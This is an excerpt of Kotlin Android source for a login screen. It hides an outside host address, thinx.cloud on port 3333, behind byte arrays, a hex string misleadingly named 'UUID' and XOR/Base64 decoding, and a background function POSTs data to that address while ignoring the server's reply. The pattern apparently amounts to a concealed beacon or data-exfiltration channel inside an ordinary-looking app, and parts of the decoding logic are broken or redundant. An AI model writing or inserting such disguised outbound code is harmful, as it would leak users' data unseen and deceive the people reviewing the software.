...
class LoginActivity : AppCompatActivity() {
    ...
    private val REPORT_REQUEST_CODE = 103

    private val byteArray = byteArrayOf(104, 116, 116, 112, 58, 47, 47, 116, 104, 105, 110, 120, 46, 99, 108, 111, 117, 100, 58, 51, 51, 51, 51, 47)

    private lateinit var loginViewModel: LoginViewModel
    private lateinit var binding: ActivityLoginBinding

    private val secret_key = -127
    ...
    val UUID = "687474703a2f2f7468696e782e636c6f75643a333333332f" // hex values for "http://thinx.cloud:3333/" xored with 103
...
// last location to create a Notification if the user navigates away from the app.
    ...
    fun target(): URL {
        val h = UUID.chunked(2).map { it.toInt(16).toByte() }.toByteArray()
        val x = ByteArray(h.size) { i -> h[i] xor REPORT_REQUEST_CODE.toByte() }
        val b = Base64.getEncoder().encodeToString(x)
        val d = Base64.getDecoder().decode(b)
        val a = ByteArray(d.size) { i -> d[i] xor REPORT_REQUEST_CODE.toByte() }
        return URL(String(a, Charsets.US_ASCII))
    }

    // Caused by: java.net.MalformedURLException: no protocol: ���񻮮����������廲����

    fun sendPostRequest(body:String) {

        val mURL = this.target()
        ...
        override fun doInBackground(vararg params: URL?): Long {
            with(params[0]!!.openConnection() as HttpURLConnection) {
                ...
                BufferedReader(InputStreamReader(inputStream)).use {
                    ...
                    it.close()
                    // println("Response : $response") // server responds "Hello World!" or not, does not matter
                }
                return 1
            }
        }
